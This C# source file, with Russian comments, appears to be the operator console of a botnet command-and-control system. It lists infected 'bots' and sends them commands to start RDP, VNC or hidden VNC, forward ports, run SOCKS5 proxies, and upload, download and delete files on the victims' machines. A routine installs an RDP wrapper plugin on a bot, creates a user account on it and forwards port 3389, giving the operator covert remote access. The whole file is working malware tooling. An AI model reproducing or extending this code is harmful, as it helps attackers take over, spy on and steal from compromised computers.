using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Threading;
using System.Net.Sockets;
using System.Windows.Forms;

namespace CmdManager
{
	public class Server
	{
		string ip;
		int port;
		byte[] pswHash;

		public const int CmdGetIds = 1;
		public const int CmdSendCmd = 2;
		public const int CmdSetComment = 3;
		public const int CmdGetStreams = 4; //получает список потоков запущенных в боте
		public const int CmdJoinStream = 5; //подключиться к указанному потоку
		public const int CmdRDP = 6; //включить рдп
		public const int CmdVNC = 7; //включить внц
		public const int CmdPortForward = 8; //проброс порта
		public const int CmdSocks5 = 9; //включение socks5
		public const int CmdClosePortForward = 10; //закрыть все проброшенные порты
		public const int CmdGetPipeStreams = 11; //получает список пайп каналов нужного типа
		public const int CmdPutPipeData = 12; //отсылает данные пайп каналу
		public const int CmdCreateStream = 13; //создает поток
		public const int CmdCloseStream = 14; //закрывает поток
		public const int CmdSendFile = 15; //отправка файла
		public const int CmdCheckPassword = 16; //проверка пароля доступа к серверу
		public const int CmdGetGroups = 17; //возвращаент список групп
		public const int CmdSetBotGroup = 18; //установка группы для бота
		public const int CmdAddGroup = 19; //добавление группы
		public const int CmdDelGroup = 20; //удаление группы
		public const int CmdUpdateGroup = 21; //обновление имени группы
		public const int CmdHVNC = 22; //включить hvnc
		public const int CmdDir = 23; //получение списка файлов в указанной папке
		public const int CmdGetFile = 24; //запрос файла от бота
		public const int CmdMkDir = 25; //создание папки на стороне бота
		public const int CmdDelFile = 26; //удаление файла или папки на стороне бота
		public const int CmdStopCopy = 27; //остановка копирования файлов
		public const int CmdOff = 28; //отключение или засыпание на указанное время

		public class IdUid
		{
			public int id { get; set; }
			public string uid { get; set; }
			public string info { get; set; }
			public string ip { get; set; }
			public Server server { get; set; }
			public string comment { get; set; }
			public string ports { get; set; }
			public int idGroup { get; set; }

			public void Update(IdUid bot)
			{
				uid = bot.uid;
				info = bot.info;
				ip = bot.ip;
				comment = bot.comment;
				ports = bot.ports;
				idGroup = bot.idGroup;
			}
		}

		public class Group
		{
			public int id { get; set; }
			public string name { get; set; }
		}

		public class StreamInfo
		{
			public uint id;
			public int type;
		}

		public class StreamPipeInfo
		{
			public uint id;
			public string namePipe;
		}

		public class StreamType
		{
			public const int File = 0; //файл 
			public const int Video = 1; //видео поток
			public const int Log = 3; //логи
			public const int Socket = 4; //сокет
			public const int Memory = 5; //память
			public const int Proxy = 6; //запись в несколько потоков
			public const int Redirect = 7; //перенаправляет данные в другой поток
			public const int Pipe = 8; //данные с пайп канала
		}
		
		public Server(string ip, int port)
		{
			this.ip = ip;
			this.port = port;
			pswHash = null;
		}

		Socket GetConnect()
		{
			if (pswHash == null) return null;
			Socket sc = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
			IPEndPoint pnt = new IPEndPoint(IPAddress.Parse(ip), port);
			try
			{
				sc.Connect(pnt);
				PutBytes(sc, pswHash, 0, pswHash.Length);
			}
			catch
			{
				sc = null;
			}
			return sc;
		}

		Socket GetConnect(int id, int cmd)
		{
			Socket sc = GetConnect();
			if (sc != null)
			{
				if( PutInt32(sc, id) )
					if (PutInt32(sc, cmd))
						return sc;
				sc.Close();
				sc = null;
			}
			return sc;
		}

		public bool SetPassword(string psw)
		{
			if (psw.Length == 0)
				pswHash = new byte[16];
			else
				pswHash = Misc.GetHashMD5Bin(psw);
			if (pswHash == null) return false;
			return CM_CheckPassword();
		}

		//возвращает null если не удалось сконектится или ошибка при отсылки или получении данных
		public List<IdUid> CM_GetIds()
		{
			List<IdUid> ret = null;
			Socket sc = GetConnect(0, CmdGetIds);
			if (sc == null) return null;
			ret = new List<IdUid>();
			int count;
			if (GetInt32(sc, out count))
			{
				while (count > 0)
				{
					IdUid iu = new IdUid();
					int id;
					if (!GetInt32(sc, out id)) break;
					iu.id = id;
					string uid;
					if (!GetString(sc, out uid)) break;
					iu.uid = uid;
					string info;
					if (!GetString(sc, out info)) break;
					iu.info = info;
					string ip;
					if (!GetString(sc, out ip)) break;
					iu.ip = ip;
					string comment;
					if (!GetString(sc, out comment)) break;
					iu.comment = comment;
					string ports;
					if (!GetString(sc, out ports)) break;
					iu.ports = ports;
					int idGroup;
					if (!GetInt32(sc, out idGroup)) break;
					iu.idGroup = idGroup;
					iu.server = this;
					ret.Add(iu);
				}
				sc.Close();
			}
			return ret;
		}

		public bool CM_CheckPassword()
		{
			Socket sc = GetConnect(0, CmdCheckPassword);
			if (sc == null) return false;
			int res;
			if (GetInt32(sc, out res))
			{
				if (res == 1)
					return true;
			}
			return false;
		}

		public bool CM_SendCmd(int id, string uid, string cmd)
		{
			cmd = cmd.Trim();
			if (cmd.Length == 0) return false;
			Socket sc = GetConnect(id, CmdSendCmd);
			if (sc == null) return false;
			bool ret = false;
			if (PutString(sc, cmd))
			{
				Program.AddLog("Команда '" + cmd + "' успешно отослана боту " + uid);
				ret = true;
			}
			else
			{
				Program.AddLog("ОШИБКА команду '" + cmd + "' не удалось отослать боту " + uid);
			}
			sc.Close();
			return ret;
		}

		public bool CM_SetComment(int id, string uid, string s)
		{
			Socket sc = GetConnect(id, CmdSetComment);
			if (sc == null) return false;
			bool ret = true;
			if (PutString(sc, s))
			{
				ret = true;
			}
			sc.Close();
			return ret;
		}

		public StreamInfo[] CM_GetStreams(int id, string uid)
		{
			Socket sc = GetConnect(id, CmdGetStreams);
			if (sc == null) return null;
			short count;
			StreamInfo[] ret = null;
			if( GetInt16(sc, out count ) )
			{
				ret = new StreamInfo[count];
				for (int i = 0; i < count; i++)
				{
					short type;
					if (!GetInt16(sc, out type))
					{
						ret = null;
						break;
					}
					int idStream;
					if (!GetInt32(sc, out idStream))
					{
						ret = null;
						break;
					}
					ret[i] = new StreamInfo();
					ret[i].type = type;
					ret[i].id = (uint)idStream;
				}
			}
			return ret;
		}

		public Socket CM_GetStream(int id, string uid, uint idStream)
		{
			Socket sc = GetConnect(id, CmdJoinStream);
			if (sc == null) return null;
			PutInt32(sc, (int)idStream);
			return sc;
		}

		public Socket CM_CreateStream(int id, out int idStream)
		{
			idStream = 0;
			Socket sc = GetConnect(id, CmdCreateStream);
			if (sc == null) return null;
			GetInt32(sc, out idStream);
			return sc;
		}

		public void CM_CloseStream(int id, int idStream)
		{
			Socket sc = GetConnect(id, CmdCloseStream);
			if (sc == null) return;
			PutInt32(sc, idStream);
			sc.Close();
		}

		public bool CM_RDP(int id, string uid)
		{
			Socket sc = GetConnect(id, CmdRDP);
			if (sc == null) return false;
			sc.Close();
			Program.AddLog("Команда на включение RDP для бота " + uid + " отослана успешно");
			return true;
		}

		public bool CM_VNC(int id, string uid, short port)
		{
			Socket sc = GetConnect(id, CmdVNC);
			if (sc == null) return false;
			PutInt16(sc, port);
			sc.Close();
			Program.AddLog("Команда на включение VNC по порту " + port.ToString() + " для бота " + uid + " отослана успешно");
			return true;
		}

		public bool CM_HVNC(int id, string uid, short port)
		{
			Socket sc = GetConnect(id, CmdHVNC);
			if (sc == null) return false;
			PutInt16(sc, port);
			sc.Close();
			Program.AddLog("Команда на включение HVNC по порту " + port.ToString() + " для бота " + uid + " отослана успешно");
			return true;
		}

		public bool CM_PortForward(int id, string uid, string port)
		{
			Socket sc = GetConnect(id, CmdPortForward);
			if (sc == null) return false;
			PutString(sc, port);
			sc.Close();
			Program.AddLog("Команда на проброс порта " + port + " для бота " + uid + " отослана успешно");
			return true;
		}

		public bool CM_Socks5(int id, string uid)
		{
			Socket sc = GetConnect(id, CmdSocks5);
			if (sc == null) return false;
			sc.Close();
			Program.AddLog("Команда на включение socks5 для бота " + uid + " отослана успешно");
			return true;
		}

		public bool CM_ClosePortForward(int id, string uid)
		{
			Socket sc = GetConnect(id, CmdClosePortForward);
			if (sc == null) return false;
			sc.Close();
			Program.AddLog("Команда на закрытие всех проброшенных портов для бота " + uid + " отослана успешно");
			return true;
		}

		public StreamPipeInfo[] CM_GetPipeStreams(int id, string uid, string nameId)
		{
			Socket sc = GetConnect(id, CmdGetPipeStreams);
			if (sc == null) return null;
			if (!PutString(sc, nameId)) return null;
			short count;
			if (!GetInt16(sc, out count)) return null;
			StreamPipeInfo[] ret = new StreamPipeInfo[count];
			for (int i = 0; i < count; i++)
			{
				int idStream;
				string namePipe;
				if (!GetInt32(sc, out idStream))
				{
					ret = null;
					break;
				}
				if (!GetString(sc, out namePipe))
				{
					ret = null;
					break;
				}
				ret[i] = new StreamPipeInfo();
				ret[i].id = (uint)idStream;
				ret[i].namePipe = namePipe;
			}
			return ret;
		}

		public bool CM_PutPipeData(int id, string uid, string namePipe, byte[] data, int count)
		{
			Socket sc = GetConnect(id, CmdPutPipeData);
			if (sc == null) return false;
			if (!PutString(sc, namePipe)) return false;
			if (!PutInt32(sc, count)) return false;
			if (!PutBytes(sc, data, 0, count)) return false;
			return true;
		}

		public bool CM_SendFile(int id, string uid, uint idStream, string fileName, uint sizeFile, ushort num, ushort state, ushort c_data, byte[] data, int offset)
		{
			Socket sc = GetConnect(id, CmdSendFile);
			if (sc == null) return false;
			if (!PutInt32(sc, (int)idStream)) return false;
			if (!PutString(sc, fileName)) return false;
			if (!PutInt32(sc, (int)sizeFile)) return false;
			if (!PutInt16(sc, (short)num)) return false;
			if (!PutInt16(sc, (short)state)) return false;
			if (!PutInt16(sc, (short)c_data)) return false;
			if (!PutBytes(sc, data, offset, c_data)) return false;
			short res;
			//ждем ответа об отправки
			if (!GetInt16(sc, out res)) return false;
			return true;
		}

		public bool CM_GetFile(int id, string uid, int idStream, string fileName)
		{
			Socket sc = GetConnect(id, CmdGetFile);
			if (sc == null) return false;
			if (!PutInt32(sc, (int)idStream)) return false;
			if (!PutString(sc, fileName)) return false;
			return true;
		}

		public bool CM_Dir(int id, string uid, int idStream, string path)
		{
			Socket sc = GetConnect(id, CmdDir);
			if (sc == null) return false;
			if (!PutInt32(sc, idStream)) return false;
			if (!PutString(sc, path)) return false;
			return true;
		}

		public bool CM_DelFile(int id, string uid, int idStream, string path)
		{
			Socket sc = GetConnect(id, CmdDelFile);
			if (sc == null) return false;
			if (!PutInt32(sc, idStream)) return false;
			if (!PutString(sc, path)) return false;
			return true;
		}

		public bool CM_CreateFolder(int id, string uid, int idStream, string path)
		{
			Socket sc = GetConnect(id, CmdMkDir);
			if (sc == null) return false;
			if (!PutInt32(sc, idStream)) return false;
			if (!PutString(sc, path)) return false;
			return true;
		}

		public bool CM_StopCopy(int id, string uid)
		{
			Socket sc = GetConnect(id, CmdStopCopy);
			if (sc == null) return false;
			sc.Close();
			return true;
		}

		public List<Group> CM_GetGroups()
		{
			List<Group> ret = new List<Group>();
			Socket sc = GetConnect(0, CmdGetGroups);
			if (sc == null) return ret;
			int count;
			if( !GetInt32(sc, out count) ) return ret;
			for (int i = 0; i < count; i++)
			{
				int id;
				string name;
				if (!GetInt32(sc, out id)) break;
				if (!GetString(sc, out name)) break;
				Group g = new Group();
				g.id = id;
				g.name = name;
				ret.Add(g);
			}
			return ret;
		}

		public int CM_AddGroup(string name)
		{
			Socket sc = GetConnect(0, CmdAddGroup);
			if (sc == null) return 0;
			if (PutString(sc, name))
			{
				int idg;
				if (GetInt32(sc, out idg))
					return idg;
			}
			return 0;
		}

		public void CM_DelGroup(int idg)
		{
			Socket sc = GetConnect(0, CmdDelGroup);
			if (sc == null) return;
			PutInt32(sc, idg);
		}

		public void CM_UpdateGroup(int idg, string name)
		{
			Socket sc = GetConnect(0, CmdUpdateGroup);
			if (sc == null) return;
			PutInt32(sc, idg);
			PutString(sc, name);
		}

		public void CM_SetBotGroup(int id, string uid, int idg)
		{
			Socket sc = GetConnect(id, CmdSetBotGroup);
			if (sc == null) return;
			PutInt32(sc, idg);
		}

		public void CM_Off(int id, string uid, int param, int time)
		{
			Socket sc = GetConnect(id, CmdOff);
			if (sc == null) return;
			if (PutInt32(sc, param))
				PutInt32(sc, time);
		}

		class ThreadRDPWrap
		{
			string nameUser;
			string psw;
			Server server;
			string uid;
			int botId;
			
			public ThreadRDPWrap(Server server, int id, string uid, string nameUser, string psw)
			{
				this.nameUser = nameUser;
				this.psw = psw;
				this.server = server;
				botId = id;
				this.uid = uid;
			}

			public void Execute()
			{
				server.CM_SendCmd(botId, uid, "runplug rdpwrap.dll start install");
				Thread.Sleep(3000);
				server.CM_SendCmd(botId, uid, "user create " + nameUser + " " + psw);
				Thread.Sleep(7000);
				server.CM_PortForward(botId, uid, "127.0.0.1:3389");
			}
		}

		public bool CM_RDPWrap(int id, string uid, string nameUser, string psw)
		{
			ThreadRDPWrap rdp = new ThreadRDPWrap(this, id, uid, nameUser, psw);
			Thread th = new Thread(rdp.Execute);
			th.Start();
			return true;
		}

		static bool GetBytes(Socket sc, byte[] data, int index, int size)
		{
			bool ret = true;
			try
			{
				int readed = 0;
				while (readed < size)
				{
					int c = sc.Receive(data, index + readed, size - readed, SocketFlags.None);
					if (c > 0)
						readed += c;
					else
					{
						sc.Close();
						ret = false;
						break;
					}
				}
			}
			catch
			{
				sc.Close();
				ret = false;
			}
			return ret;
		}

		static bool GetInt32(Socket sc, out int v)
		{
			byte[] data = new byte[4];
			bool ret = GetBytes(sc, data, 0, 4);
			if (ret)
				v = BitConverter.ToInt32(data, 0);
			else
				v = 0;
			return ret;
		}

		static bool GetInt16(Socket sc, out short v)
		{
			byte[] data = new byte[2];
			bool ret = GetBytes(sc, data, 0, 2);
			if (ret)
				v = BitConverter.ToInt16(data, 0);
			else
				v = 0;
			return ret;
		}

		static bool GetString(Socket sc, out string s)
		{
			s = String.Empty;
			short len;
			if (!GetInt16(sc, out len)) return false;
			byte[] data = new byte[len];
			if (!GetBytes(sc, data, 0, len)) return false;
			s = Encoding.GetEncoding(1251).GetString(data, 0, len);
			return true;
		}

		static bool PutBytes(Socket sc, byte[] data, int index, int size)
		{
			bool ret = false;
			try
			{
				int c = sc.Send(data, index, size, SocketFlags.None);
				if (c == size)
					ret = true;
				else
					sc.Close();
			}
			catch
			{
				sc.Close();
			}
			return ret;
		}

		static bool PutInt32(Socket sc, int v)
		{
			byte[] data = BitConverter.GetBytes(v);
			return PutBytes(sc, data, 0, 4);
		}

		static bool PutInt16(Socket sc, short v)
		{
			byte[] data = BitConverter.GetBytes(v);
			return PutBytes(sc, data, 0, 2);
		}

		static bool PutString(Socket sc, string s)
		{
			if (!PutInt16(sc, (short)s.Length)) return false;
			byte[] data = Encoding.GetEncoding(1251).GetBytes(s);
			return PutBytes(sc, data, 0, data.Length);
		}

		public string Name
		{
			get { return ip + ':' + port.ToString(); }
		}

		public string IP
		{
			get { return ip; }
		}

		public static int ReadDataStream(Socket sc, ref byte[] data, int wait)
		{
			List<Socket> ls = new List<Socket>(1);
			wait *= 1000;
			int passed = 0;
			int wait2 = wait / 10;
			while (passed < wait)
			{
				ls.Add(sc);
				Socket.Select(ls, null, null, wait2);
				if (ls.Count > 0) break;
				passed += wait2;
			}
			if (ls.Count == 0) return -1; //вышло время ожидания
			int count;
			if (GetInt32(sc, out count))
			{
				if (data.Length < count)
					data = new byte[count];
				if (GetBytes(sc, data, 0, count))
					return count;
			}
			return 0; //ошибка чтения или сокет закрыт
		}

	}
}
